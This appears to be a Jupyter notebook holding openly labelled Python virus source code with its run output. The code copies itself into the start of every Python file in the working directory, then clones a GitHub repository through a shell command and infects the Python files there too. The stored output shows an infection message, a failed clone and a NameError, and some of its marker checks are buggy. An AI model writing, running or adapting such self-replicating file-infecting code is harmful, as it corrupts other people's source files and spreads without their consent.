{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 1,
   "id": "4325fb69",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "YOU HAVE BEEN INFECTED HAHAHA !!!\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "Cloning into 'testor'...\n",
      "fatal: could not read Username for 'https://github.com': Device not configured\n"
     ]
    },
    {
     "ename": "NameError",
     "evalue": "name '__file__' is not defined",
     "output_type": "error",
     "traceback": [
      "\u001b[0;31m---------------------------------------------------------------------------\u001b[0m",
      "\u001b[0;31mNameError\u001b[0m                                 Traceback (most recent call last)",
      "\u001b[0;32m/var/folders/6g/ptcnvd7x0kb6gdcl1q1kz0mh0000gn/T/ipykernel_62218/2164213431.py\u001b[0m in \u001b[0;36m<module>\u001b[0;34m\u001b[0m\n\u001b[1;32m     61\u001b[0m \u001b[0mvirus_code\u001b[0m \u001b[0;34m=\u001b[0m \u001b[0;34m[\u001b[0m\u001b[0;34m]\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m     62\u001b[0m \u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0;32m---> 63\u001b[0;31m \u001b[0;32mwith\u001b[0m \u001b[0mopen\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0m__file__\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0;34m\"r\"\u001b[0m\u001b[0;34m)\u001b[0m \u001b[0;32mas\u001b[0m \u001b[0mf\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m\u001b[1;32m     64\u001b[0m     \u001b[0mlines\u001b[0m \u001b[0;34m=\u001b[0m \u001b[0mf\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mreadlines\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m     65\u001b[0m \u001b[0;34m\u001b[0m\u001b[0m\n",
      "\u001b[0;31mNameError\u001b[0m: name '__file__' is not defined"
     ]
    }
   ],
   "source": [
    "# VIRUS SAYS HI!\n",
    "\n",
    "import sys\n",
    "import glob\n",
    "\n",
    "virus_code = []\n",
    "\n",
    "with open(sys.argv[0], 'r') as f:\n",
    "  lines = f.readlines()\n",
    "\n",
    "self_replicating_part = False\n",
    "for line in lines:\n",
    "  if line == \"# VIRUS SAYS HI!\":\n",
    "    self_replicating_part = True\n",
    "  if not self_replicating_part:\n",
    "    virus_code.append(line)\n",
    "  if line == \"# VIRUS SAYS BYE!\\n\":\n",
    "    break\n",
    "\n",
    "python_files = glob.glob('*.py') + glob.glob('*.pyw')\n",
    "\n",
    "for file in python_files:\n",
    "  with open(file, 'r') as f:\n",
    "    file_code = f.readlines()\n",
    "\n",
    "  infected = False\n",
    "\n",
    "  for line in file_code:\n",
    "    if line == \"# VIRUS SAYS HI!\\n\":\n",
    "      infected = True\n",
    "      break\n",
    "\n",
    "  if not infected:\n",
    "    final_code = []\n",
    "    final_code.extend(virus_code)\n",
    "    final_code.extend('\\n')\n",
    "    final_code.extend(file_code)\n",
    "\n",
    "    with open(file, 'w') as f:\n",
    "      f.writelines(final_code)\n",
    "\n",
    "\n",
    "def malicious_code():\n",
    "  print(\"YOU HAVE BEEN INFECTED HAHAHA !!!\")\n",
    "\n",
    "\n",
    "malicious_code()\n",
    "\n",
    "# VIRUS SAYS BYE!\n",
    "\n",
    "import os\n",
    "import glob\n",
    "\n",
    "repository_url = \"https://github.com/ammarshse/testor.git\"\n",
    "repository_name = repository_url.split(\"/\")[-1].split(\".\")[0]\n",
    "repository_folder = f\"{os.getcwd()}/{repository_name}\"\n",
    "\n",
    "if not os.path.exists(repository_folder):\n",
    "    os.system(f\"git clone {repository_url}\")\n",
    "    \n",
    "virus_code = []\n",
    "\n",
    "with open(__file__, \"r\") as f:\n",
    "    lines = f.readlines()\n",
    "\n",
    "self_replicating_part = False\n",
    "for line in lines:\n",
    "    if line == \"# VIRUS SAYS HI!\\n\":\n",
    "        self_replicating_part = True\n",
    "    if not self_replicating_part:\n",
    "        virus_code.append(line)\n",
    "    if line == \"# VIRUS SAYS BYE!\\n\":\n",
    "        break\n",
    "\n",
    "python_files = glob.glob(f\"{repository_folder}/*.py\") + glob.glob(f\"{repository_folder}/*.pyw\")\n",
    "\n",
    "for file in python_files:\n",
    "    with open(file, \"r\") as f:\n",
    "        file_code = f.readlines()\n",
    "\n",
    "    infected = False\n",
    "\n",
    "    for line in file_code:\n",
    "        if line == \"# VIRUS SAYS HI!\\n\":\n",
    "            infected = True\n",
    "            break\n",
    "\n",
    "    if not infected:\n",
    "        final_code = []\n",
    "        final_code.extend(virus_code)\n",
    "        final_code.extend([\"\\n\"])\n",
    "        final_code.extend(file_code)\n",
    "\n",
    "        with open(file, \"w\") as f:\n",
    "            f.writelines(final_code)\n",
    "\n",
    "print(\"You have been infected.\")\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "81da2f14",
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3 (ipykernel)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.9.13"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
